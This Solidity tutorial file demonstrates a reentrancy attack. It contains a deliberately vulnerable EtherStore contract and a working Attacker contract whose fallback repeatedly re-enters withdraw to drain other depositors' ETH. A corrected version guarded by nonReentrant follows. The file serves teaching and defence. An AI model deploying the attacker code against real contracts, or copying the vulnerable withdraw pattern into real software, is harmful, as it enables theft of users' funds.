// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

//Vulnerability
// Let's say that contract A calls contract B.
// Reentracy exploit allows B to call back into A before A finishes execution.

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/
contract EtherStore {
    event Deposited(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    mapping(address => uint256) public balances;

    function deposit() external payable {
        address user = msg.sender;
        uint256 amount = msg.value;
        balances[user] += amount;

        emit Deposited(user, amount);
    }

    function withdraw() external {
        address user = msg.sender;
        uint256 amount = balances[user];
        require(amount > 0, "amount must greater than 0");

        Address.sendValue(payable(user), amount);

        balances[user] = 0;

        emit Withdraw(user, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    event Attacked(address indexed user);

    EtherStore private s_etherStore;

    uint256 private constant AMOUNT = 1 ether;

    constructor(address etherStore_) {
        s_etherStore = EtherStore(etherStore_);
    }

    fallback() external payable {
        if (s_etherStore.getBalance() > AMOUNT) {
            s_etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value > AMOUNT, "insufficient balance");
        s_etherStore.deposit{value: AMOUNT}();
        s_etherStore.withdraw();

        emit Attacked(msg.sender);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

//-------------------------------Good example-------------------------------------------------------------
// Preventative Techniques
// 1.Ensure all state changes happen before calling external contracts
// 2.Use function modifiers that prevent re-entrancy

contract EtherStoreGood is ReentrancyGuard {
    event Deposited(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    mapping(address => uint256) public balances;

    function deposit() external payable {
        address user = msg.sender;
        uint256 amount = msg.value;
        balances[user] += amount;

        emit Deposited(user, amount);
    }

    function withdraw() external nonReentrant {
        address user = msg.sender;
        uint256 amount = balances[user];
        require(amount > 0, "amount must greater than 0");

        balances[user] = 0; // Ensure all state changes happen before calling external contracts
        Address.sendValue(payable(user), amount);

        emit Withdraw(user, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
